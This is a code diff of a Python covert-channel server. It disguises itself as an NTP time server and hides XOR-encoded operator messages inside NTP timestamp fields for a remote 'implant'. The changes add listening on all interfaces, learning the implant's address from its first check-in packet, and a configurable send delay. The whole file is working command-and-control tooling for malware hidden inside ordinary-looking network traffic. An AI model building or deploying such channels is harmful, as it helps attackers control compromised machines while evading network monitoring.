@@ -2,15 +2,18 @@ import socket
 import ntplib
 import struct
 import math
+import time
+import sys
 
 PRIVATE_KEY_WORD='Bruh'
 PRIVATE_KEY=PRIVATE_KEY_WORD.encode('ascii')
+SLEEP=0
 
 def pack_fixed32(float_value : float):
     fraction, integer = math.modf(float_value)
     integer = int(integer)
     fraction = int(fraction * (2**16))
-
+    
     #!: Big endian
     #H: unsigned short (2 bytes == 16 bits)
     return struct.pack('!HH', integer, fraction)
@@ -51,16 +54,10 @@ def send_ntp_response(sock : socket.socket, client_address : str, client_port : 
 
     #Modify flags in receive_timestamp
     if last_packet:
-        #Set "last packet" flag
         receive_timestamp[7] |= 1
-        length = len(data)
-        print("Length:", length)
+        length = len(data) - 1
         receive_timestamp[7] |= (length << 1)
-        # #Indicate number of bytes to read from transmit_timestamp
-        # byte_count_flag_position = 6 #changing bits 6 and 7
-        # bit_mask = 0b11 << byte_count_flag_position #mask = 00000110
-        # receive_timestamp[7] &= ~bit_mask #clear counter flag bits
-        # receive_timestamp[7] |= (len(data) << byte_count_flag_position)
+        
     else:
         #Final byte bits: xxxxx110
         receive_timestamp[7] |= (0 << 0)
@@ -73,14 +70,11 @@ def send_ntp_response(sock : socket.socket, client_address : str, client_port : 
     # modifying second byte for sequence
     receive_timestamp[7] |= shift & 0xFF
 
-    print(bin(receive_timestamp[6]), bin(receive_timestamp[7]))
-
-    #TODO Set sequnce number
-
     #Overwrite the final 4 bytes of transmit_timestamp with data
     xored_data = bytes([b ^ k for b, k in zip(data, PRIVATE_KEY)])
     for i in range(0, len(xored_data)):
-        transmit_timestamp[i + 4] = xored_data[i]
+        transmit_timestamp[i + 4] =  xored_data[i]
+    
 
     #Build packet
     packet = b''
@@ -97,26 +91,41 @@ def send_ntp_response(sock : socket.socket, client_address : str, client_port : 
     packet += transmit_timestamp
 
     sock.sendto(packet, (client_address, client_port))
+    time.sleep(SLEEP)
+    
+
+if (len(sys.argv) > 1):
+    SLEEP = int(sys.argv[1])
+else:
+    print("No sleep duration specified, assuming 0")
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock.bind(("127.0.0.1", 123))
+sock.bind(("0.0.0.0", 1234))
 
-client_address = "127.0.0.1"
-client_port = 8080
+# Receive address information from implant before beginning stream
+packet, addr = sock.recvfrom(1024)
+client_address = socket.inet_ntoa(packet[:4])
+client_port = struct.unpack('!H', packet[4:6])[0]
+
 
 while(True):
     message = input("Type your message.\nTo exit, press Enter.\n\n")
     if len(message) == 0:
         exit(0)
 
+    print("Sending message...\n")
     data = b''
     seq = 0
-    for char in message:
+    for i, char in enumerate(message):
         data += char.encode('ascii')
         if len(data) == 4:
-            send_ntp_response(sock, client_address, client_port, data, False, seq)
+            if i == len(message) - 1:
+                send_ntp_response(sock, client_address, client_port, data, True, seq)
+            else:
+                send_ntp_response(sock, client_address, client_port, data, False, seq)
             data = b''
             seq+= 1
+            # time.sleep(64)
 
     #Send remaining data (<4 bytes)
     if len(data) != 0:
@@ -124,4 +133,4 @@ while(True):
     
     seq = 0
     
-    print("\nMessage sent to implant.\n")
+    print("Message sent to implant.\n")
